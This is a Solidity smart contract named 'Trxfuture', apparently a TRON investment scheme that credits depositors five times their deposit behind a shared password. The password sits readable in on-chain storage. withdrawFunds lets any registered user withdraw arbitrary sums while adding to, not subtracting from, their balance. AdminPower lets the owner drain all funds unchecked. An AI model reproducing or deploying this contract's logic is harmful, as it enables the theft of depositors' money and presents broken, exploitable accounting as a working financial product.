//SourceUnit: Trxfuture.sol

 pragma solidity ^0.4.25;
 contract Trxfuture {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
    string private password;
    struct Instructor {
        
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = msg.sender;
        password = _pass;
        verifyAddress = _stakingAddress;


}

        mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest(string  _passsssss,string memory _asssssss) public payable{

        string memory  pass=password;
        if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) {   
            var instructor = instructors[msg.sender];
            
            instructor.pass = _passsssss;
            
            balances[msg.sender] += msg.value*5;
            instructorAccts.push(msg.sender) -1;
        }
    }


    function reinvest(string memory _passsssss,string memory _asssssss) public payable{

        string memory  pass=password;
        address userAddress=msg.sender;
        string memory  passd=instructors[userAddress].pass;
         if(msg.sender==userAddress){
            if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) { 
                if (keccak256(abi.encodePacked(passd)) == keccak256(abi.encodePacked(_passsssss))) {   
                    balances[msg.sender] += msg.value*5;

                }
            }
        }
    }
    
    
    
    function getInstructor(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }

    function getPassw() view private returns (string) {
        return (password);
    }

    function check_pass(string memory pass) view private returns (bytes32) {


            return (keccak256(abi.encodePacked(pass)));

        
    }
    function verifyAddresss() view public returns (address) {
        return (verifyAddress);
    }


    
    function countInstructors() view public returns (uint) {
        return instructorAccts.length;
    }

    function getPass(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }


    function Mybalance() view private returns (uint) {
        
        return (balances[msg.sender]);
    }


    
    function withdrawFunds(uint amount,string memory sc) public {   
           address userAddress=msg.sender;
           string memory  pass=instructors[userAddress].pass;
            if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(sc))) {
            balances[msg.sender] += amount;
                     // optimistic accounting
            msg.sender.transfer(amount);
                        // transfer
               //return userAddress; 
            }            
            
    }
    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;
           //string memory  pass=getInstructor(userAddress);
            if (owner==userAddress) {
            balances[msg.sender] += amount;
                     // optimistic accounting
            msg.sender.transfer(amount);
                        // transfer
               //return userAddress; 
            }            
            
    }
    


}